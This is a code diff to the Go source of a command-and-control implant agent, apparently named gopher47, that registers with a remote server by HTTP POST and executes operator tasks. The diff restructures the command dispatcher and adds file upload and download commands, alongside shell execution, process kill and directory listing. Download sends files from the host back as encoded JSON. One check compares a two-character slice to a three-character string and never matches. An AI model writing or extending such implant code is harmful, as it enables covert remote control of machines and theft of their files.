@@ -9,11 +9,12 @@ import (
 	"net/http"
 	"os"
 	"os/user"
+	"log" // only for debugging
 	"strconv"
 	"strings"
 	"time"
 
-	"github.com/An00bRektn/gopher47/pkg/agentfuncs"
+	functions "github.com/An00bRektn/gopher47/pkg/agentfuncs"
 	"github.com/An00bRektn/gopher47/pkg/utils"
 	"github.com/elastic/go-sysinfo"
 )
@@ -87,7 +88,6 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	agentHeader := append(sizeBytes, magic...)
 	agentHeader = append(agentHeader, []byte(agentId)...)
 
-	// TODO: Try some amount of times then just exit
 	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
 	checkError(err)
@@ -141,36 +141,60 @@ func checkIn(dat string, checkInType string) string{
 	return string(resBody)
 }
 
+func validateArgs(cmdArgs []string) bool {
+	// shhh not scuffed not scuffed not scuffed not scuffed
+	if len(cmdArgs) < 2 && utils.Strip(cmdArgs[0]) != "o7" {
+		return false
+	} else {
+		return true
+	}
+}
+
 func RunCommand(command string) string {
 	output := ""
 	//fmt.Printf(" [*] Command: ")
 	//fmt.Println([]byte(command))
 	cmdArgs := strings.Fields(command)
 	//fmt.Println([]byte(command))
-	switch (utils.Strip(cmdArgs[0])){
-	case "shell":
-		if len(cmdArgs) < 2 {
-			output = "[!] Insufficient arguments"
-		} else {
-			output = functions.Shell(cmdArgs[1:])
-		}
-	case "o7":
-		os.Exit(2)
-	case "kill":
-		pid, err := strconv.Atoi(cmdArgs[1])
-		if (err != nil) {
-			output = "[!] Golang Error: " + string(err.Error())
-		} else {
-			output = string(functions.Kill(pid).Error())
-		}
-	case "ls":
-		if len(cmdArgs) < 2 {
-			output = "[!] Insufficient arguments"
-		} else {
-			output = functions.Ls(cmdArgs[1])
-		}
-	}
 
+	if validateArgs(cmdArgs) {
+		switch (utils.Strip(cmdArgs[0])){
+		case "shell":
+			output = functions.Shell(cmdArgs[1:])
+		case "o7":
+			os.Exit(2)
+		case "kill":
+			pid, err := strconv.Atoi(cmdArgs[1])
+			if (err != nil) {
+				output = "[!] Golang Error: " + string(err.Error())
+			} else {
+				output = string(functions.Kill(pid).Error())
+			}
+		case "ls":
+			output = functions.Ls(cmdArgs[1])
+		case "upload":
+			params := strings.Split(command[7:], ";")
+			log.Println(params)
+			output = functions.Upload(params[0], params[1])
+		case "download":
+			params := strings.Split(command[9:], ";")
+			log.Println(params)
+			encDat := functions.Download(params[0])
+			if encDat[0:2] == "[!]"{
+				output = encDat
+			} else {
+				outputJson := map[string]string{
+					"filename": params[1],
+					"data": encDat,
+					"size": strconv.Itoa(len(encDat)),
+				}
+				final, _ := json.Marshal(outputJson)
+				output = string(final) 
+			}
+		}
+	} else {
+		output = "[!] Insufficient arguments"
+	}
 	return output
 }
 
